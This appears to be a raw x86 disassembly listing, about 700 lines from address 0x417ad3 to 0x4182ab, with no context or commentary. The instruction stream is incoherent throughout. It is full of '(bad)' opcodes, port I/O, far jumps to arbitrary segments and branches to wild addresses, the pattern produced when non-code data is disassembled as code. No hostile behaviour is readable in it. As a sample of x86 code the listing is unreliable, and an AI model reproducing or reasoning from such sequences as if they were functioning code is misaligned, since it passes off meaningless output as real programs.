  417ad3:	add    ebp,edx
  417ad5:	push   esp
  417ad7:	push   edx
  417ad8:	fstp   QWORD PTR [edx-0x6841648e]
  417ade:	inc    esi
  417adf:	out    0x32,al
  417ae1:	(bad)  
  417ae2:	or     al,0x11
  417ae4:	mov    ebp,0x928a8b27
  417ae9:	in     eax,dx
  417aea:	adc    eax,0x666b067c
  417aef:	test   BYTE PTR [ecx-0x405aa723],0x0
  417af6:	mov    DWORD PTR [esi],esi
  417af8:	repz add eax,0xb8baa46e
  417afe:	dec    eax
  417aff:	mov    ecx,0xb922417e
  417b04:	jmp    0x4051:0x31efde80
  417b0b:	popa   
  417b0c:	jmp    0x3f56f7e9
  417b11:	push   0x537877ad
  417b16:	cmp    al,0xfc
  417b18:	pop    eax
  417b19:	outs   dx,DWORD PTR ds:[esi]
  417b1a:	fiadd  WORD PTR [edx*8+0x240926ce]
  417b21:	shl    BYTE PTR [eax],cl
  417b23:	mov    cs,edi
  417b25:	call   0x2af5:0x36ce22f
  417b2c:	int3   
  417b2d:	ds repz dec edi
  417b30:	sar    DWORD PTR ds:0x907cffbd,cl
  417b36:	repz in al,0x32
  417b39:	pop    es
  417b3a:	retf   
  417b3b:	aam    0xf9
  417b3d:	mov    es,WORD PTR [ebx+0x7179b31d]
  417b43:	mov    edx,DWORD PTR [ecx]
  417b45:	cmp    BYTE PTR [eax+0x7a9008e3],dh
  417b4b:	adc    bh,BYTE PTR [ebx+edx*2-0x7f9b5e03]
  417b52:	jo     0x417b9a
  417b54:	arpl   WORD PTR [edi+0x3e],bp
  417b57:	lods   al,BYTE PTR ds:[esi]
  417b58:	pushf  
  417b59:	sub    DWORD PTR [ecx-0x2e6ef239],edi
  417b5f:	into   
  417b60:	add    esi,DWORD PTR [esi-0x20]
  417b63:	push   es
  417b64:	cs loop 0x417b08
  417b67:	out    dx,eax
  417b68:	dec    edi
  417b69:	adc    DWORD PTR [esi-0x45e9f4bb],0xffffffb8
  417b70:	sbb    ebp,ebx
  417b72:	(bad)  
  417b74:	imul   edi,DWORD PTR [eax+0x470b57b8],0xffffff86
  417b7b:	sbb    BYTE PTR [ecx-0x50],ah
  417b7e:	pop    ebx
  417b7f:	mov    WORD PTR [esi-0x210954db],?
  417b85:	inc    ebp
  417b86:	in     al,dx
  417b87:	fadd   QWORD PTR [ebp+ebp*8-0x72]
  417b8b:	xor    al,0x9
  417b8d:	pop    ecx
  417b8e:	rcr    al,1
  417b90:	int3   
  417b91:	add    esp,esi
  417b93:	xchg   ebp,eax
  417b94:	mov    bh,0xcd
  417b96:	and    esp,DWORD PTR [ebx+0x5]
  417b99:	fadd   st,st(0)
  417b9b:	jl     0x417bb8
  417b9d:	push   0xd
  417b9f:	xor    al,0x82
  417ba1:	sbb    cl,cl
  417ba3:	out    dx,al
  417ba4:	mov    ebx,0x1fda560a
  417ba9:	ret    
  417baa:	fild   WORD PTR [edi+0x6f]
  417bad:	es pop eax
  417baf:	outs   dx,DWORD PTR ds:[esi]
  417bb0:	js     0x417b7e
  417bb2:	rcl    BYTE PTR [esi-0x258fee12],1
  417bb8:	xchg   esi,eax
  417bb9:	(bad)
  417bbc:	mov    edx,0x97421ad4
  417bc1:	test   eax,0x81e62b5
  417bc6:	sar    DWORD PTR [edx-0x58],1
  417bc9:	lea    ecx,[ecx-0x60]
  417bcc:	gs loope 0x417b66
  417bcf:	out    0x99,al
  417bd1:	jge    0x417b5e
  417bd3:	test   ebp,eax
  417bd5:	mov    ds:0xf396c9c1,al
  417bda:	pop    eax
  417bdb:	jp     0x417be3
  417bdd:	dec    eax
  417bde:	out    0x84,al
  417be0:	or     BYTE PTR [ecx],dh
  417be2:	push   ebp
  417be3:	inc    esi
  417be4:	clc    
  417be5:	and    eax,0x925b71c8
  417bea:	outs   dx,DWORD PTR ds:[esi]
  417beb:	cs mov bl,0xdd
  417bee:	nop
  417bef:	mov    bh,0x6f
  417bf1:	mov    edi,0x22e4ce02
  417bf6:	idiv   ah
  417bf8:	test   DWORD PTR [ecx+0xc],edx
  417bfb:	ror    DWORD PTR [ebx+0x5ca20b87],cl
  417c01:	push   esp
  417c02:	and    bl,BYTE PTR [ebx+0x78b24bbc]
  417c08:	or     DWORD PTR ds:0x4b9bfa86,ebp
  417c0e:	fisubr DWORD PTR [ecx-0x63]
  417c11:	add    BYTE PTR [edx+0x2c],cl
  417c14:	iret   
  417c15:	mov    bl,0xe1
  417c17:	aam    0xcd
  417c19:	dec    ebx
  417c1a:	xchg   ebx,eax
  417c1b:	retf   0xb406
  417c1e:	test   al,0xc4
  417c20:	add    ch,BYTE PTR [ebp+ebp*8-0x77]
  417c24:	cmp    eax,0xd67c1253
  417c29:	std    
  417c2a:	jo     0x417bbd
  417c2c:	sbb    BYTE PTR [ebx],bl
  417c2e:	sbb    ecx,DWORD PTR gs:[ecx+0x28e4a40d]
  417c35:	and    eax,DWORD PTR [esp+ebp*1+0x32d0d271]
  417c3c:	mov    bl,0x6a
  417c3e:	xlat   BYTE PTR ds:[ebx]
  417c3f:	push   0xdd811e12
  417c44:	sbb    al,0xd7
  417c46:	pop    eax
  417c47:	daa    
  417c48:	das    
  417c49:	mov    DWORD PTR [ebx-0x44a882be],esi
  417c4f:	push   ebp
  417c50:	dec    ebx
  417c51:	das    
  417c52:	xchg   edi,ebx
  417c54:	xor    ebx,edx
  417c56:	aas    
  417c57:	ja     0x417c04
  417c59:	jae    0x417c42
  417c5b:	frstor [edx]
  417c5d:	dec    esp
  417c5e:	scas   eax,DWORD PTR es:[edi]
  417c5f:	cmp    DWORD PTR [esi-0x61aaed2e],0xe25e0dc7
  417c69:	add    eax,0xf83f5a4e
  417c6e:	mov    ds:0x57c9da82,al
  417c73:	mov    eax,0x1d6059f8
  417c78:	ret    
  417c79:	xor    al,0xe0
  417c7b:	xchg   edx,eax
  417c7c:	mov    esp,0x373ea771
  417c81:	jmp    0x76c2297a
  417c86:	sub    ebx,DWORD PTR [esi]
  417c88:	mov    eax,ds:0x8c8403b9
  417c8d:	and    DWORD PTR cs:0xa33476f1,0x6b9eff25
  417c98:	(bad)  
  417c99:	push   ds
  417c9a:	adc    eax,0xfaa37299
  417c9f:	mov    ebx,0x90cdb031
  417ca4:	not    DWORD PTR [eax+0x63e0bbe0]
  417caa:	aaa    
  417cab:	mov    BYTE PTR [edx-0x71],bh
  417cae:	add    al,0xf8
  417cb0:	in     al,dx
  417cb1:	js     0x417c8b
  417cb3:	std    
  417cb4:	dec    edx
  417cb5:	cmp    al,0xe5
  417cb7:	popf   
  417cb8:	xor    cl,al
  417cba:	push   eax
  417cbb:	dec    ebp
  417cbc:	jg     0x417cb8
  417cbe:	pop    esp
  417cbf:	mov    edx,0x448dd22f
  417cc4:	aam    0xd1
  417cc6:	xchg   ebx,eax
  417cc7:	mov    bl,BYTE PTR [ebp-0x4b]
  417cca:	sbb    BYTE PTR [ecx+0x262186d2],0x77
  417cd1:	fld    TBYTE PTR [ebp-0x3323208c]
  417cd7:	mov    esp,DWORD PTR [eax-0x33cdd666]
  417cdd:	outs   dx,BYTE PTR ds:[esi]
  417cde:	cld    
  417cdf:	push   ds
  417ce0:	fs pop esp
  417ce2:	imul   ebp,DWORD PTR [edx],0xffffffc6
  417ce5:	in     al,dx
  417ce6:	sub    dl,BYTE PTR [esi-0x4d334b6d]
  417cec:	fsubr  QWORD PTR [ebx-0x3ce67a7c]
  417cf2:	sub    al,0x80
  417cf4:	mov    BYTE PTR [edi],cl
  417cf6:	jns    0x417cd1
  417cf8:	push   ebp
  417cf9:	scas   eax,DWORD PTR es:[edi]
  417cfa:	add    cl,bh
  417cfc:	lahf   
  417cfd:	sub    al,0xe5
  417cff:	add    cl,ch
  417d01:	test   DWORD PTR ds:0xadfbc914,ebp
  417d07:	push   es
  417d08:	mov    ds:0x562115d2,eax
  417d0d:	dec    eax
  417d0e:	or     eax,0x89b51ee3
  417d13:	scas   eax,DWORD PTR es:[edi]
  417d14:	push   eax
  417d15:	ins    DWORD PTR es:[edi],dx
  417d16:	jp     0x417d5d
  417d18:	es cwde 
  417d1a:	xor    WORD PTR [eax+0x1a],bx
  417d1e:	xchg   al,dl
  417d20:	pop    ss
  417d21:	dec    ecx
  417d22:	xlat   BYTE PTR ds:[ebx]
  417d23:	into   
  417d24:	jmp    0x49d94fa2
  417d29:	cwde   
  417d2a:	mov    WORD PTR [eax-0x5aa85098],gs
  417d30:	sub    BYTE PTR [esi-0x11],cl
  417d33:	cs jg  0x417d3e
  417d36:	imul   esi,DWORD PTR ds:0xf1d9c1c3,0x6e9f6349
  417d40:	cmp    al,0xa
  417d42:	mov    al,0xd5
  417d44:	sbb    cl,BYTE PTR [bp+0x60d1]
  417d49:	mov    ds:0x6fd1c3d2,al
  417d4e:	pop    ecx
  417d4f:	mov    dl,0xe6
  417d51:	dec    esp
  417d52:	mov    bl,0x9b
  417d54:	(bad)  
  417d55:	mov    dl,BYTE PTR [esi-0x66c5d992]
  417d5b:	and    esi,eax
  417d5d:	aas    
  417d5e:	or     BYTE PTR [esi-0x17020f6f],ah
  417d64:	add    edx,eax
  417d66:	fs out 0x3b,eax
  417d69:	mov    ecx,0x48b363f1
  417d6e:	xor    al,0xd8
  417d70:	repnz inc ecx
  417d72:	ret    0x50d1
  417d75:	out    0x5f,al
  417d77:	loope  0x417dc7
  417d79:	enter  0x7168,0x1e
  417d7d:	lods   eax,DWORD PTR ds:[esi]
  417d7e:	and    DWORD PTR [ebx-0x4af68cd4],ebx
  417d84:	mov    WORD PTR [edx+0x6062da80],?
  417d8a:	sub    DWORD PTR [ebx],esp
  417d8c:	pop    esi
  417d8d:	jmp    0x8b243a3
  417d92:	dec    esp
  417d93:	scas   eax,DWORD PTR es:[edi]
  417d94:	pushf  
  417d95:	(bad)  
  417d96:	or     eax,0x2a8a517e
  417d9b:	and    BYTE PTR [edi-0x27],0xdf
  417d9f:	sub    DWORD PTR [ecx],ecx
  417da1:	dec    esi
  417da2:	inc    ecx
  417da4:	(bad)  
  417da5:	sbb    BYTE PTR [edi-0x52],ch
  417da8:	fimul  DWORD PTR [edx-0x21]
  417dab:	pop    esi
  417dac:	push   esi
  417dad:	xchg   edx,eax
  417dae:	imul   esi,DWORD PTR [edi-0x4ad35a20],0x84eaea40
  417db8:	mov    ebp,0xd7da886b
  417dbd:	ins    DWORD PTR es:[edi],dx
  417dbe:	xchg   edi,eax
  417dbf:	and    ch,BYTE PTR [ecx+eiz*4-0x6b]
  417dc3:	cmp    al,0x77
  417dc5:	xchg   edx,eax
  417dc6:	and    al,0x88
  417dc8:	push   ebx
  417dc9:	push   ecx
  417dca:	jns    0x417d5a
  417dcc:	add    ecx,DWORD PTR [edi+0x173d691b]
  417dd2:	mov    edx,0x842fc7ca
  417dd7:	pusha  
  417dd8:	fmul   DWORD PTR [ecx-0x39]
  417ddb:	ins    BYTE PTR es:[edi],dx
  417ddc:	mov    bl,0x7d
  417dde:	dec    ebp
  417ddf:	xchg   ebp,eax
  417de0:	sub    BYTE PTR [edx+edx*2],dh
  417de3:	popf   
  417de4:	ja     0x417dee
  417de6:	cmp    al,0x32
  417de8:	jle    0x417dcd
  417dea:	xlat   BYTE PTR ds:[ebx]
  417deb:	stc    
  417dec:	pop    edi
  417ded:	pop    ebp
  417dee:	or     BYTE PTR [edi],dh
  417df0:	jg     0x48e66b3e
  417df6:	and    ecx,DWORD PTR [eax]
  417df8:	cli    
  417df9:	xlat   BYTE PTR ds:[ebx]
  417dfa:	shl    esp,cl
  417dfc:	fist   WORD PTR [ebx]
  417dfe:	sar    DWORD PTR [eax+0x23445d81],0xd6
  417e05:	fld    TBYTE PTR [edx+0x4ce99e83]
  417e0b:	cwde   
  417e0c:	fs dec ebp
  417e0e:	mov    dl,0x3f
  417e10:	jo     0x417e7a
  417e12:	and    DWORD PTR [edx],edi
  417e14:	pop    ebp
  417e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e16:	jle    0x417e2d
  417e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e19:	pop    ebx
  417e1a:	and    DWORD PTR [ecx-0x63],0xfffffff6
  417e1e:	jmp    0x24fe:0xd22ae69d
  417e25:	cmp    DWORD PTR [edx],0x2c2547c
  417e2b:	mov    WORD PTR [ebp+0x49],?
  417e2e:	mov    edx,gs
  417e30:	mov    edi,0xc3cfeffd
  417e35:	xor    eax,0x784971a3
  417e3a:	mov    ebx,0x446a1404
  417e3f:	retf   0x612b
  417e42:	add    ebp,DWORD PTR [eax-0x7816ffe2]
  417e48:	adc    cl,BYTE PTR [eax]
  417e4a:	test   BYTE PTR [edx+0xe],bh
  417e4d:	xchg   ebp,eax
  417e4e:	sbb    edi,DWORD PTR [ebp+0x3a]
  417e51:	(bad)  
  417e52:	mov    dh,BYTE PTR [eax]
  417e54:	xchg   ebp,eax
  417e55:	ud2    
  417e57:	dec    edx
  417e58:	pop    ss
  417e59:	dec    ebx
  417e5a:	das    
  417e5b:	int3   
  417e5c:	pop    edi
  417e5d:	(bad)  
  417e5e:	push   esp
  417e5f:	in     eax,dx
  417e60:	push   ebp
  417e61:	pop    ebx
  417e62:	outs   dx,DWORD PTR ds:[esi]
  417e63:	shl    DWORD PTR [ecx-0x13],cl
  417e66:	or     esi,DWORD PTR [edx-0x32]
  417e69:	gs aam 0xac
  417e6c:	lods   eax,DWORD PTR ds:[esi]
  417e6d:	mov    bl,0xe7
  417e6f:	lahf   
  417e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e71:	ins    DWORD PTR es:[edi],dx
  417e72:	adc    DWORD PTR [esi-0x507a876c],ebp
  417e78:	adc    al,0x31
  417e7a:	push   edi
  417e7b:	call   0x2fef6c7f
  417e80:	mov    ds:0x5be7cb06,eax
  417e85:	stos   DWORD PTR es:[edi],eax
  417e86:	retf   
  417e87:	push   ebp
  417e88:	sub    BYTE PTR [edi+eiz*2-0x5e],bl
  417e8c:	mov    al,0x96
  417e8e:	in     eax,0xfb
  417e90:	mov    ds,edi
  417e92:	jo     0x417ede
  417e94:	jb     0x417ed3
  417e96:	dec    ecx
  417e97:	dec    edi
  417e98:	jmp    0xe596:0x32cfe536
  417e9f:	fist   WORD PTR [ebp+0x54]
  417ea2:	sub    eax,0x5b97cfe2
  417ea7:	jo     0x417e35
  417ea9:	(bad)  
  417eaa:	ins    BYTE PTR es:[edi],dx
  417eab:	cmovb  ecx,DWORD PTR [ebx+0x6edeacfa]
  417eb2:	test   eax,0x39a3d240
  417eb7:	int    0xa
  417eb9:	dec    ebx
  417eba:	dec    esi
  417ebb:	mov    es,esi
  417ebd:	jge    0x417e9b
  417ebf:	xor    al,0x2e
  417ec1:	pop    esp
  417ec2:	inc    ecx
  417ec3:	mov    ch,0x2d
  417ec5:	(bad)  
  417ec6:	fucomp st(6)
  417ec8:	out    dx,al
  417ec9:	xchg   edx,eax
  417eca:	imul   edi,DWORD PTR [ecx+eiz*2],0xfc2e12df
  417ed1:	ret    0xee0b
  417ed4:	int    0x2a
  417ed6:	xchg   edx,eax
  417ed7:	dec    dl
  417ed9:	cwde   
  417eda:	fs mov ebp,0x32999de
  417ee0:	ret    
  417ee1:	pop    edi
  417ee2:	sbb    cl,dh
  417ee4:	call   0x36b76cbe
  417ee9:	mov    ch,0xf6
  417eeb:	pop    esp
  417eec:	cmp    esi,edi
  417eee:	and    eax,DWORD PTR [ebx+0x56]
  417ef1:	sub    eax,0x1464d84b
  417ef6:	arpl   WORD PTR [esi-0x222eb31e],di
  417efc:	and    dl,BYTE PTR [ebx]
  417efe:	xlat   BYTE PTR ds:[ebx]
  417eff:	call   0x9ade:0x832a703b
  417f06:	inc    eax
  417f07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f08:	push   edi
  417f09:	jp     0x417f00
  417f0b:	test   DWORD PTR [esi+esi*4],ecx
  417f0e:	add    dh,dh
  417f10:	jae    0x417f64
  417f12:	push   ss
  417f13:	neg    bl
  417f15:	adc    al,0x7d
  417f17:	sahf   
  417f18:	mov    dl,0x98
  417f1a:	pop    esp
  417f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f1c:	lods   al,BYTE PTR ds:[esi]
  417f1d:	xchg   ecx,eax
  417f1e:	adc    DWORD PTR [ebx+0x12],ebx
  417f21:	mov    bl,0xa0
  417f23:	dec    esp
  417f24:	pop    eax
  417f25:	mov    edi,0xcbc9fc2a
  417f2a:	mov    edx,0xfe3ae6e0
  417f2f:	xor    edx,DWORD PTR [edi+ecx*2+0x47b790fa]
  417f36:	pushf  
  417f37:	and    edx,DWORD PTR [ebx-0x4fff5c39]
  417f3d:	(bad)  
  417f3e:	stc    
  417f3f:	jbe    0x417f65
  417f41:	cs (bad) 
  417f43:	ds cmp ecx,eax
  417f46:	mov    edx,0xe16755e1
  417f4b:	out    dx,eax
  417f4c:	out    0x27,eax
  417f4e:	push   ebp
  417f4f:	fstp   TBYTE PTR [edx]
  417f51:	in     eax,0xfa
  417f53:	outs   dx,DWORD PTR ds:[esi]
  417f54:	outs   dx,DWORD PTR ds:[esi]
  417f55:	cmp    ecx,DWORD PTR [ebx]
  417f57:	pusha  
  417f58:	test   al,0x42
  417f5a:	push   0xffffff96
  417f5c:	jne    0x417f59
  417f5e:	sub    DWORD PTR [ebp+eiz*2+0x2f],ecx
  417f62:	sub    eax,0xc133da46
  417f67:	call   0x8a379d94
  417f6c:	ja     0x417fb6
  417f6e:	je     0x417f9d
  417f70:	ret    0x8baf
  417f73:	mov    ah,0xab
  417f75:	test   al,0x29
  417f77:	xor    eax,DWORD PTR [ebx*4+0x3ceec243]
  417f7e:	sbb    ebx,DWORD PTR [eax]
  417f80:	fsub   DWORD PTR [ecx+0x40]
  417f83:	xor    al,0x74
  417f85:	mov    cl,0xe
  417f87:	mov    ebp,0xdde5d8ae
  417f8c:	imul   ebp,DWORD PTR [eax+0x7a],0xf38e2c6c
  417f93:	mov    edi,DWORD PTR [ebx+0x4]
  417f96:	push   eax
  417f97:	push   edi
  417f98:	push   edx
  417f99:	call   0x41dfb1
  417f9e:	shld   edx,eax,0x2
  417fa2:	shl    eax,0x2
  417fa5:	jmp    0x41852f
  417faa:	lods   al,BYTE PTR ds:[esi]
  417fab:	jecxz  0x41802b
  417fad:	sar    BYTE PTR [eax],0x20
  417fb0:	sub    bl,dl
  417fb2:	hlt    
  417fb3:	gs push eax
  417fb5:	je     0x417f56
  417fb7:	(bad)  
  417fb8:	int3   
  417fb9:	outs   dx,BYTE PTR ds:[esi]
  417fba:	xor    edi,DWORD PTR [ecx+0xc]
  417fbd:	push   ss
  417fbe:	cmp    eax,0x33161604
  417fc3:	xchg   ebx,eax
  417fc4:	push   edi
  417fc5:	sub    al,0x6b
  417fc7:	inc    edi
  417fc8:	pop    ebp
  417fc9:	adc    eax,0x17ea6027
  417fce:	add    esi,esp
  417fd0:	push   es
  417fd1:	cmp    edi,esp
  417fd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fd4:	mov    edx,gs
  417fd6:	les    di,DWORD PTR [edi]
  417fd9:	mov    dh,0x7d
  417fdb:	jno    0x417fc6
  417fdd:	or     BYTE PTR [edx+0x45ae52fd],ah
  417fe3:	push   ss
  417fe4:	ins    DWORD PTR es:[edi],dx
  417fe5:	dec    BYTE PTR ds:0x735b601e
  417feb:	inc    ebp
  417fec:	or     DWORD PTR [eax],edi
  417fee:	jnp    0x417ff8
  417ff0:	and    al,0xc6
  417ff2:	sar    BYTE PTR [eax+0x51],0xba
  417ff6:	mov    al,0x23
  417ff8:	out    0xa4,al
  417ffa:	(bad)  
  417ffb:	push   ss
  417ffc:	dec    ebx
  417ffd:	xchg   edx,eax
  417ffe:	jmp    0x484402f9
  418003:	lock jo 0x41806e
  418006:	fldcw  WORD PTR [ecx+0x45]
  418009:	lods   al,BYTE PTR ds:[esi]
  41800a:	dec    edx
  41800b:	jmp    0x71801f5c
  418010:	mov    ss,WORD PTR [ebx-0x26ca8002]
  418016:	or     DWORD PTR [edx-0x7c36431f],eax
  41801c:	adc    BYTE PTR [ecx],al
  41801e:	std    
  41801f:	ss scas al,BYTE PTR es:[edi]
  418021:	cwde   
  418022:	aas    
  418023:	xor    eax,esi
  418025:	xor    eax,0x13fe4aed
  41802a:	pop    ecx
  41802b:	jae    0x418069
  41802d:	in     al,0x23
  41802f:	fcom   QWORD PTR [ecx-0x1]
  418032:	cdq    
  418033:	inc    eax
  418034:	retf   
  418035:	sbb    DWORD PTR [edi+0x76],edx
  418038:	sbb    DWORD PTR [edx+0x7e],0x30
  41803c:	mov    ah,BYTE PTR [edi]
  41803e:	cmp    eax,0xbafa2e02
  418043:	imul   edi,DWORD PTR [ebx+edi*8-0xc],0x7435f63
  41804b:	ret    
  41804c:	mov    al,ds:0x19140681
  418051:	not    cl
  418053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418054:	add    DWORD PTR [ecx],0xfffffff9
  418057:	push   ecx
  418058:	dec    esp
  418059:	inc    esp
  41805a:	adc    eax,0xffb8b05f
  41805f:	xchg   edi,eax
  418060:	int3   
  418061:	jne    0x41808e
  418063:	dec    ebx
  418064:	fldenv [eax]
  418066:	push   esi
  418067:	mov    WORD PTR [eax+0x11866ef2],ss
  41806d:	fsubr  QWORD PTR [ebp+0x468c516]
  418073:	jmp    0xd867b798
  418078:	je     0x418092
  41807a:	inc    edi
  41807b:	(bad)
  41807e:	sub    al,0xa
  418080:	or     BYTE PTR [eax],cl
  418082:	in     eax,0x35
  418084:	and    ecx,ebx
  418086:	xor    al,0x95
  418088:	sub    ebp,DWORD PTR [ebx+edi*4]
  41808b:	(bad)  
  41808c:	cmp    dl,BYTE PTR [ecx-0x37]
  41808f:	jno    0x418068
  418091:	lock dec eax
  418093:	and    al,0x24
  418095:	ins    DWORD PTR es:[edi],dx
  418096:	xchg   ecx,eax
  418097:	inc    ecx
  418098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418099:	mov    eax,0xab5e03df
  41809e:	xchg   esi,eax
  41809f:	mov    cl,0x5e
  4180a1:	es mov al,0xd3
  4180a4:	or     ch,dl
  4180a6:	out    0xcd,al
  4180a8:	(bad)
  4180ad:	(bad)  
  4180ae:	loope  0x41805d
  4180b0:	out    0xe7,eax
  4180b2:	add    cl,al
  4180b4:	fimul  WORD PTR [edx]
  4180b6:	in     al,dx
  4180b7:	mov    WORD PTR [edi+ecx*1],?
  4180ba:	repnz sbb esp,ecx
  4180bd:	and    al,0x9f
  4180bf:	mov    ds:0x2493749d,al
  4180c4:	imul   esp,DWORD PTR [edi+0x28],0x7c
  4180c8:	sbb    DWORD PTR [bx+di+0x2f56],0xffffffd6
  4180ce:	daa    
  4180cf:	(bad)  
  4180d0:	aad    0xcc
  4180d2:	and    eax,0xfffdfd67
  4180d7:	das    
  4180d8:	sub    DWORD PTR [esi],esp
  4180da:	jl     0x41813e
  4180dc:	push   ecx
  4180dd:	cmp    eax,0x527ee7d1
  4180e2:	lods   al,BYTE PTR ds:[esi]
  4180e3:	aad    0x99
  4180e5:	pusha  
  4180e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e7:	xchg   edi,eax
  4180e8:	xchg   edx,eax
  4180e9:	shl    ch,cl
  4180eb:	add    eax,ebx
  4180ed:	sti    
  4180ee:	mov    edi,0x8684e868
  4180f3:	sti    
  4180f4:	cmc    
  4180f5:	lock push esi
  4180f7:	aas    
  4180f8:	push   edx
  4180f9:	ret    0x63a4
  4180fc:	ds test esi,esp
  4180ff:	loop   0x4180de
  418101:	jmp    0x95a0bd32
  418106:	(bad)  
  418107:	fadd   DWORD PTR [esi-0x4ec91a39]
  41810d:	aam    0xa6
  41810f:	fadd   st,st(0)
  418111:	ror    DWORD PTR [ecx-0x3ab5c5a9],1
  418117:	jbe    0x4180bc
  418119:	retf   0xc386
  41811c:	fdivr  st,st(5)
  41811e:	xor    eax,0xe0497d25
  418123:	popa   
  418124:	push   edi
  418125:	pop    edx
  418126:	push   esi
  418127:	or     al,0xc3
  418129:	addr16 adc eax,0xf504b2ef
  41812f:	ins    DWORD PTR es:[edi],dx
  418130:	fdivrp st(6),st
  418132:	pop    ds
  418133:	popa   
  418134:	shl    BYTE PTR [edx+ecx*1],cl
  418137:	cs dec ebp
  418139:	xchg   DWORD PTR [eax+0xc],ebp
  41813c:	cmp    ebx,0x1b
  41813f:	add    esi,esi
  418141:	imul   ebx,DWORD PTR [eax+0x12],0xffffffd8
  418145:	pop    ss
  418146:	and    ecx,DWORD PTR [ebx]
  418148:	sbb    eax,0x5c80f753
  41814d:	gs mov dh,0x52
  418150:	ror    BYTE PTR [edi-0x7f514bba],1
  418156:	ds push 0x1e
  418159:	pop    ds
  41815a:	mov    edx,0xd8d2d19e
  41815f:	xchg   ecx,eax
  418160:	inc    eax
  418161:	(bad)  
  418162:	jge    0x41816d
  418164:	rol    BYTE PTR [edi],0xc0
  418167:	push   edi
  418168:	sbb    BYTE PTR [edi+0x6b7c97e7],al
  41816e:	outs   dx,BYTE PTR ds:[esi]
  41816f:	je     0x41816d
  418171:	xchg   ebx,eax
  418172:	fimul  WORD PTR [eax+0xecb189f]
  418178:	fist   DWORD PTR [edx+0x4608a332]
  41817e:	aad    0x86
  418180:	xor    BYTE PTR ds:0x3c87adb2,0x85
  418187:	cmp    bh,ah
  418189:	adc    al,0x13
  41818b:	pop    ds
  41818c:	pushf  
  41818d:	pop    ebp
  41818e:	adc    al,0xe7
  418190:	aad    0xc
  418192:	hlt    
  418193:	icebp  
  418194:	lods   al,BYTE PTR ds:[esi]
  418195:	pop    DWORD PTR [esi-0x50]
  418198:	sbb    al,0x7c
  41819a:	repz xor DWORD PTR [edi-0x5340e4da],0x19242ee4
  4181a5:	scas   eax,DWORD PTR es:[edi]
  4181a6:	inc    eax
  4181a7:	mov    gs:0xe557e7b4,al
  4181ad:	retf   
  4181ae:	loopne 0x4181f0
  4181b0:	add    al,0x49
  4181b2:	shl    bh,1
  4181b4:	inc    edx
  4181b5:	ficom  WORD PTR [ebx+eiz*4]
  4181b8:	imul   eax,DWORD PTR [edx],0x24354a01
  4181be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181bf:	dec    edi
  4181c0:	cdq    
  4181c1:	arpl   WORD PTR [esi-0x31543a6d],sp
  4181c7:	add    ebx,ebp
  4181c9:	lods   eax,DWORD PTR ds:[esi]
  4181ca:	jl     0x41815f
  4181cc:	dec    edx
  4181cd:	das    
  4181ce:	das    
  4181cf:	add    ch,BYTE PTR [ecx]
  4181d1:	es inc esi
  4181d3:	cmp    bh,BYTE PTR [edi+0x33ac6921]
  4181d9:	(bad)  
  4181da:	outs   dx,BYTE PTR ds:[esi]
  4181db:	adc    al,0x15
  4181dd:	js     0x418161
  4181df:	pop    ebp
  4181e0:	xor    ch,BYTE PTR [ecx-0x6648c31b]
  4181e6:	xor    DWORD PTR [eax],ebx
  4181e8:	push   ds
  4181e9:	stc    
  4181ea:	aam    0x6c
  4181ec:	fisttp DWORD PTR [eax-0x56be7483]
  4181f2:	pushf  
  4181f3:	sti    
  4181f4:	push   ecx
  4181f5:	fsub   QWORD PTR [edx+0x17]
  4181f8:	out    0xbc,al
  4181fa:	dec    ebp
  4181fb:	mov    esp,0xdac36b30
  418200:	mov    eax,DWORD PTR [ebp+ecx*1-0x7f90603a]
  418207:	mov    ds:0xbb18ed94,eax
  41820c:	mov    ecx,0xa8f93a85
  418211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418212:	sbb    ch,ah
  418214:	adc    dl,BYTE PTR [ebx+0x57]
  418217:	jg     0x418211
  418219:	pop    ebx
  41821a:	test   DWORD PTR [edx],ecx
  41821c:	xchg   esi,eax
  41821d:	sub    ebp,DWORD PTR [esi+0x2a05e294]
  418223:	and    BYTE PTR [edi-0x3c],cl
  418226:	or     edi,DWORD PTR [ecx-0x109f316d]
  41822c:	xchg   ebp,eax
  41822d:	jle    0x4181fc
  41822f:	pop    eax
  418230:	dec    ecx
  418231:	jb     0x418237
  418233:	fbstp  TBYTE PTR [ebx+0x66]
  418236:	fsubr  DWORD PTR [edx-0x22]
  418239:	inc    ebx
  41823a:	jmp    0x58bc:0xdbc7a06d
  418241:	jno    0x41820a
  418243:	scas   al,BYTE PTR es:[edi]
  418244:	push   esi
  418245:	push   edx
  418246:	mov    ds:0xb0048caf,eax
  41824b:	sub    eax,0x23c5ba88
  418250:	outs   dx,BYTE PTR ds:[esi]
  418251:	and    edi,ebx
  418253:	mov    al,ds:0x4d504873
  418258:	(bad)  
  418259:	push   edx
  41825a:	jne    0x418216
  41825c:	ror    DWORD PTR [edx-0x4663c3c9],cl
  418262:	sbb    BYTE PTR [eax-0x729973bf],ah
  418268:	push   0xbd5eef12
  41826d:	mov    al,ds:0x2548974a
  418272:	shr    DWORD PTR [eax],1
  418274:	stos   BYTE PTR es:[edi],al
  418275:	mov    bl,0x4a
  418277:	dec    esi
  418278:	jb     0x41825a
  41827a:	lds    ebx,FWORD PTR [edx+0x5165fc87]
  418280:	mov    cl,0x45
  418282:	cmp    dl,BYTE PTR [ecx]
  418284:	sbb    eax,0x47ff0480
  418289:	and    ah,BYTE PTR [ebx-0x14]
  41828c:	ror    BYTE PTR [eax],cl
  41828e:	sub    al,cl
  418290:	dec    edx
  418291:	xor    BYTE PTR [eax+0x1ada3102],0xfb
  418298:	cli    
  418299:	aam    0x98
  41829b:	mov    ds:0x2eafb217,al
  4182a0:	sbb    BYTE PTR [ebx+0x6a],dh
  4182a3:	(bad)  
  4182a4:	jle    0x418311
  4182a6:	pop    edi
  4182a7:	add    ebx,DWORD PTR ds:[esi+0x9]
  4182ab:	int    0xb
